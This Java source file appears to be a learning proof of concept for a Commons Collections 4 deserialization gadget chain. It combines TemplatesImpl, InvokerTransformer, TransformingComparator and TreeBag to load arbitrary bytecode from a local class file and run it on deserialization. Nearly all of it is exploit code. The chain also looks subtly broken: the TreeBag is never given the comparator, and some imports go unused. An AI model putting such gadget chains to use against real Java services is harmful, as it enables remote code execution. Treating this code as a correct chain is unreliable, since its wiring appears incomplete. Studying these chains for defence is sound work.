package cc;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.TreeMap;

public class TreeBag_compare {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        SerializableTest.setFieldValue(templates,"_name","aaa");
        byte[] bytes = Files.readAllBytes(Paths.get("D:\\idea\\CC\\target\\classes\\CC\\CC3Test.class"));
        String encode = Base64.getEncoder().encodeToString(bytes);
        byte[] code = Base64.getDecoder().decode(encode);
        byte[][] codes = {code};
        SerializableTest.setFieldValue(templates,"_bytecodes",codes);
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
        TransformingComparator transformingComparator = new TransformingComparator<>( new ConstantTransformer(1));

        TreeBag treeBag = new TreeBag();

        SerializableTest.setFieldValue(transformingComparator,"transformer",invokerTransformer);
        SerializableTest.searilze(treeBag,"TreeBag_compare.bin");
        SerializableTest.unzearilze("TreeBag_compare.bin");

    }
}
